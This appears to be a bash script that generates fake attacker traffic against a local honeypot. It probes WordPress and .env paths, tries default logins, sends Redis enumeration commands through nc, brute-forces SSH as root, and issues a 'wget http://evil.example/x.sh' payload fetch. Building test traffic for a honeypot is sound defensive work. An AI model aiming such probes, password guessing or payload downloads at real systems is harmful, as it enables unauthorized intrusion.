#!/usr/bin/env bash
# Simulates a bit of attacker traffic against the local honeypot.
set -u
HOST=${HOST:-localhost}

for path in / /wp-login.php /wp-admin/ /.env /xmlrpc.php "/?author=1" /wp-json/wp/v2/users /phpmyadmin/; do
  curl -s -o /dev/null -A "Mozilla/5.0 (compatible; zgrab/0.x)" "http://$HOST:8080$path"
done
curl -s -o /dev/null -X POST -d "log=admin&pwd=admin123" "http://$HOST:8080/wp-login.php"

for cmd in PING "AUTH hunter2" "INFO" "CONFIG GET *" "KEYS *"; do
  printf '%s\r\n' "$cmd" | nc -w1 "$HOST" 6379 >/dev/null
done

printf '\x00' | nc -w1 "$HOST" 3306 >/dev/null

for pw in root 123456 admin; do
  expect -c "
    set timeout 5
    spawn -noecho ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PubkeyAuthentication=no root@$HOST
    expect \"assword:\" { send \"$pw\\r\" }
    expect {
      \"assword:\" { exit }
      \"\\$\" {}
      timeout {}
    }
    foreach c {uname ls pwd \"docker ps\" \"wget http://evil.example/x.sh\"} { send \"\$c\\r\"; sleep 0.3 }
    send \"exit\\r\"
    expect eof
  " >/dev/null 2>&1
done

echo "done — check the dashboard"
